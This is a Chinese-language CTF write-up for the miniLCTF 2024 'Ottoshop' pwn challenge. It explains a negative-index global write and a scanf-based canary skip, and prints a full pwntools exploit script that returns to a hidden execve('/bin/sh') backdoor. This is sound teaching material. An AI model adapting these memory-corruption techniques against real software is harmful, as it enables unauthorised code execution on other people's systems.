# miniLCTF 2024 Ottoshop ♿ Writeup

## 题目简述

程序是一个菜单式商店，启用了栈 Canary、Full RELRO、NX，并关闭 PIE。利用链由两个漏洞组成：普通购买功能允许负下标，能够向全局数组之前写数据；输入隐藏菜单 `666` 后，`Golden` 分支存在栈溢出，但必须避开 Canary。最终目标是跳转到混在大量垃圾函数中的 `execve("/bin/sh")` 后门。

## 解题过程

### 负下标改写后门条件

`buy` 先执行数组写入，之后才检查编号是否过大，而且没有拒绝负数。以 `wheelchair`/`name` 数组起点为基准计算负下标，可以修改低地址全局变量：

```text
index -72 -> flag2
index -90 -> money 附近
```

后门函数先检查 `strcmp(flag2, "otto") == 0`，再把加密的 `flag1` 还原为 `/bin/sh\0`，最后以内联 `syscall` 执行 `execve`。因此先完成：

```python
buy(-72, b"otto")
buy(-90, b"AAAA")
```

第二次写入同时破坏正常余额逻辑，使后续菜单可以继续执行。

### 利用 scanf 跳过 Canary 槽位

隐藏菜单 `666` 开放一次 Golden 购买，函数把多个长整型读入栈数组而未正确限制索引。`scanf("%ld", ...)` 遇到只有 `+` 或 `-` 的输入时匹配失败，不写目标地址；程序又没有检查返回值，因此可用符号逐槽跳过不能改动的 Canary 字节，最后只覆盖保存的返回地址。

当前仓库构建中后门地址是 `0x4020a4`。核心交互如下：

```python
from pwn import *

io = process("./ottoshop")

def buy(index, name):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"?\n", str(index).encode())
    io.sendafter(b"name!\n", name)

buy(-72, b"otto")
buy(-90, b"AAAA")

io.sendline(b"666")
io.sendline(b"a")
io.sendline(b"3")
io.sendlineafter(b"buy?", b"4")

for _ in range(3):
    io.sendline(b"-")       # scanf 失败，不改对应槽位

io.sendline(str(0x4020a4).encode())
io.interactive()
```

地址依赖题目给出的无 PIE 二进制；若自行重新编译，应从符号或反汇编重新定位后门，而不是沿用常量。进入交互式 shell 后读取运行环境中的 flag 即可。

## 方法总结

本题把全局负下标写和栈返回地址覆盖串成一条链：前者满足后门条件，后者取得控制流。`scanf` 转换失败但调用者不检查返回值，是绕过“必须依次写栈槽”的关键。利用菜单题时不仅要看缓冲区长度，还应核对下标的下界和所有输入函数的返回值。
